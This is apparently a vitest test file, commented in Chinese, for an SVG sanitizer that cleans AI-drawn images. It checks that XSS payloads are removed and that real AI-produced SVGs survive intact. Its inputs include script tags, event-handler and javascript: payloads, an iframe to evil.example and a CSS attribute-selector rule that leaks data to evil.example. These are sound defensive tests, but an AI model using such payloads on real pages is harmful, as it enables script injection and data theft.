// @vitest-environment jsdom
/**
 * `sanitizeSvg` 的两组断言（I3，2026-09-24）
 *
 * 方法论要求："阈值类参数在**真实样本**上标定（该/不该两组）"。所以这里不是只测
 * "恶意输入被拦"，而是**同时**测 "合法输入没被拦" —— 只测前者的话，一个
 * `return ''` 的实现也能全绿，而真实后果是 AI 画的图全都不显示。
 *
 * 「没被拦」这组直接用**生产库里的真实 AI 产出**当夹具
 * （`__fixtures__/real-ai-svgs.json`，从 `~/.supercrzy/data/supercrzy.db` 的
 * `messages` 表提取的 3 个完整 SVG），并断言**清洗前后元素数量完全相等** ——
 * 这是"清洗没改动合法内容"的最强形式。
 *
 * client 的 vitest 默认 `environment: 'node'`（无 DOM），所以本文件用
 * `@vitest-environment jsdom` 单独切换环境。
 */
import { describe, it, expect } from 'vitest'
import { sanitizeSvg } from './sanitize-svg'
import realSvgsRaw from './__fixtures__/real-ai-svgs.json?raw'

const SVGNS = 'http://www.w3.org/2000/svg'
const realSvgs: string[] = JSON.parse(realSvgsRaw)

function parse(html: string): Document {
  return new DOMParser().parseFromString(`<body>${html}</body>`, 'text/html')
}
/** 把结果塞进真 DOM 再查 —— 验收断言要的是"DOM 里无 script 节点"，不是"字符串里没有 script" */
function q(html: string, sel: string): Element | null {
  return parse(html).querySelector(sel)
}
function countElements(html: string): number {
  return parse(html).querySelectorAll('*').length
}

// ============================ 夹具自检 ============================
describe('夹具本身可信', () => {
  it('真实 AI SVG 夹具非空且确实是 SVG', () => {
    expect(realSvgs.length).toBeGreaterThan(0)
    for (const s of realSvgs) expect(s.startsWith('<svg')).toBe(true)
  })

  it('真实夹具用的是 <defs> + 渐变引用（所以这两样必须放行）', () => {
    expect(realSvgs.some((s) => s.includes('<defs'))).toBe(true)
    expect(realSvgs.some((s) => s.includes('url(#'))).toBe(true)
    expect(realSvgs.some((s) => s.includes('linearGradient'))).toBe(true)
  })

  it('真实夹具里从没用过 <style>/<foreignObject>/<script>（禁用的依据）', () => {
    for (const s of realSvgs) {
      expect(s).not.toContain('<style')
      expect(s).not.toContain('foreignObject')
      expect(s).not.toContain('<script')
    }
  })
})

// ============================ 该去掉 ============================
describe('sanitizeSvg — 该去掉（攻击面）', () => {
  it('去掉 <script>：DOM 里无 script 节点（本条即 backlog I3 的验收断言）', () => {
    const out = sanitizeSvg(`<svg xmlns="${SVGNS}"><script>alert(1)</script><rect width="10" height="10"/></svg>`)
    expect(q(out, 'script')).toBeNull()
    expect(out).not.toMatch(/<script/i)
    // 反例守卫：别把整段一起删了
    expect(q(out, 'rect')).not.toBeNull()
  })

  it('去掉大小写变形的 script', () => {
    const out = sanitizeSvg(`<svg xmlns="${SVGNS}"><ScRiPt>alert(1)</ScRiPt><rect/></svg>`)
    expect(q(out, 'script')).toBeNull()
  })

  it('去掉 onload / onclick / onmouseover 事件属性', () => {
    const out = sanitizeSvg(
      `<svg xmlns="${SVGNS}" onload="alert(1)"><rect onclick="alert(2)" onmouseover="alert(3)"/></svg>`,
    )
    expect(out).not.toMatch(/onload/i)
    expect(out).not.toMatch(/onclick/i)
    expect(out).not.toMatch(/onmouseover/i)
    const el = q(out, 'rect')
    expect(el?.getAttribute('onclick')).toBeNull()
    expect(q(out, 'rect')).not.toBeNull()
  })

  it('去掉 foreignObject（它能塞进任意 HTML）', () => {
    const out = sanitizeSvg(
      `<svg xmlns="${SVGNS}"><foreignObject><iframe src="https://evil.example"></iframe></foreignObject><rect/></svg>`,
    )
    expect(out).not.toMatch(/foreignObject/i)
    expect(out).not.toMatch(/iframe/i)
    expect(q(out, 'rect')).not.toBeNull()
  })

  it('去掉 <style>（防无脚本的 CSS 属性选择器外带）', () => {
    const out = sanitizeSvg(
      `<svg xmlns="${SVGNS}"><style>input[value^="a"]{background:url(https://evil.example/?x=a)}</style><rect/></svg>`,
    )
    expect(out).not.toMatch(/<style/i)
    expect(out).not.toContain('evil.example')
    expect(q(out, 'rect')).not.toBeNull()
  })

  it('去掉 javascript: 协议的 href', () => {
    const out = sanitizeSvg(
      `<svg xmlns="${SVGNS}" xmlns:xlink="http://www.w3.org/1999/xlink"><a xlink:href="javascript:alert(1)"><text>x</text></a></svg>`,
    )
    expect(out).not.toMatch(/javascript:/i)
    expect(q(out, 'text')).not.toBeNull()
  })

  it('去掉 embed / object / iframe', () => {
    const out = sanitizeSvg(
      `<svg xmlns="${SVGNS}"><rect/><embed src="x"/><object data="y"/><iframe src="z"/></svg>`,
    )
    expect(out).not.toMatch(/<embed|<object|<iframe/i)
    expect(out).toMatch(/<svg[\s>]/i)   // 没被整段丢空
  })

  it('HTML「突破外来内容」标签会让 SVG 提前结束 —— 这是 HTML parser 语义，不是过滤器的 bug', () => {
    // `embed` 属于 HTML 规范里"打破外来内容(foreign content)"的标签集：解析器遇到它会把
    // 当前 svg 上下文弹出，于是它**之后**的 `<rect>` 落回 HTML 命名空间 → 被 SVG 白名单丢掉。
    // 也就是说：这种输入会**截断后面的图**，而不是"只删掉那个标签"。
    // 真实 AI 产出从不含这些标签（夹具已断言），所以代价可接受；方向也是安全的（丢内容 ≠ 执行）。
    // 记在这里是为了下次有人看到"图只画了一半"时，知道该往这个方向查，而不是怀疑清洗器写错。
    const out = sanitizeSvg(`<svg xmlns="${SVGNS}"><embed src="x"/><rect width="5" height="5"/></svg>`)
    expect(out).not.toMatch(/<embed/i)
    expect(q(out, 'rect')).toBeNull()   // 明确记录「会被截断」这个事实
  })
})

// ============================ 不该去掉 ============================
describe('sanitizeSvg — 不该去掉（防清洗过度导致图全不显示）', () => {
  it('真实 AI SVG：清洗前后元素数量完全相等', () => {
    for (const [i, s] of realSvgs.entries()) {
      const out = sanitizeSvg(s)
      expect(out, `第 ${i} 个真实 SVG 被清空了`).not.toBe('')
      expect(countElements(out), `第 ${i} 个真实 SVG 的元素数被改动了`).toBe(countElements(s))
    }
  })

  it('真实 AI SVG：关键结构全部保留（defs / 渐变 / url(#) / 路径 / 文本）', () => {
    const out = sanitizeSvg(realSvgs[1])  // 最大那个（含 path + text + defs + gradient）
    expect(out).toMatch(/<svg[\s>]/i)
    expect(out).toContain('<defs')
    expect(out).toContain('linearGradient')
    expect(out).toContain('url(#')
    expect(out).toContain('<path')
    expect(out).toContain('<text')
    expect(out).toContain('<rect')
  })

  it('保留渐变定义与引用（最容易误伤的一处）', () => {
    const out = sanitizeSvg(
      `<svg xmlns="${SVGNS}" viewBox="0 0 10 10"><defs><linearGradient id="bg"><stop offset="0" stop-color="#0d1117"/></linearGradient></defs><rect fill="url(#bg)" width="10" height="10"/></svg>`,
    )
    expect(out).toContain('id="bg"')
    expect(out).toContain('url(#bg)')
    expect(q(out, 'linearGradient')).not.toBeNull()
    expect(q(out, 'stop')).not.toBeNull()
  })

  it('保留常见绘图元素与属性', () => {
    const out = sanitizeSvg(
      `<svg xmlns="${SVGNS}" viewBox="0 0 100 100" preserveAspectRatio="xMidYMid meet" font-family="Inter">` +
        `<g class="grp" opacity="0.8" transform="translate(1,2)">` +
        `<circle cx="1" cy="2" r="3"/><line x1="0" y1="0" x2="1" y2="1"/>` +
        `<polyline points="0,0 1,1"/><polygon points="0,0 1,1 2,0"/>` +
        `<text x="1" y="2" stroke-width="2" fill="#fff">hi</text></g></svg>`,
    )
    for (const sel of ['svg', 'g', 'circle', 'line', 'polyline', 'polygon', 'text']) {
      expect(q(out, sel), `丢了 <${sel}>`).not.toBeNull()
    }
    expect(out).toContain('viewBox="0 0 100 100"')
    expect(out).toContain('preserveAspectRatio')
    expect(out).toContain('font-family="Inter"')
    expect(out).toContain('transform="translate(1,2)"')
    expect(out).toContain('stroke-width="2"')
    expect(out).toContain('class="grp"')
  })

  it('保留 svgFilters（USE_PROFILES 里开了 svgFilters）', () => {
    const out = sanitizeSvg(
      `<svg xmlns="${SVGNS}"><defs><filter id="f"><feGaussianBlur stdDeviation="2"/></filter></defs><rect filter="url(#f)"/></svg>`,
    )
    expect(q(out, 'filter')).not.toBeNull()
    expect(q(out, 'feGaussianBlur')).not.toBeNull()
    expect(out).toContain('url(#f)')
  })
})

// ============================ 边界 ============================
describe('sanitizeSvg — 边界', () => {
  it('空 / null / undefined / 非字符串 → 空串', () => {
    expect(sanitizeSvg('')).toBe('')
    expect(sanitizeSvg(null)).toBe('')
    expect(sanitizeSvg(undefined)).toBe('')
    // @ts-expect-error 故意传错类型，验证运行时不炸
    expect(sanitizeSvg(123)).toBe('')
  })

  it('流式未闭合的片段不抛异常', () => {
    expect(() => sanitizeSvg(`<svg xmlns="${SVGNS}"><path d="M0 0`)).not.toThrow()
    expect(typeof sanitizeSvg(`<svg xmlns="${SVGNS}"><path d="M0 0`)).toBe('string')
  })

  it('借 SVG 通道注入的非 SVG HTML 载荷 → 整体丢弃（失败关闭）', () => {
    const out = sanitizeSvg('<div><img src=x onerror="alert(1)"><script>alert(2)</script></div>')
    expect(out).toBe('')
  })

  it('纯文本 → 丢弃（该通道只接受 SVG）', () => {
    expect(sanitizeSvg('hello world')).toBe('')
  })
})
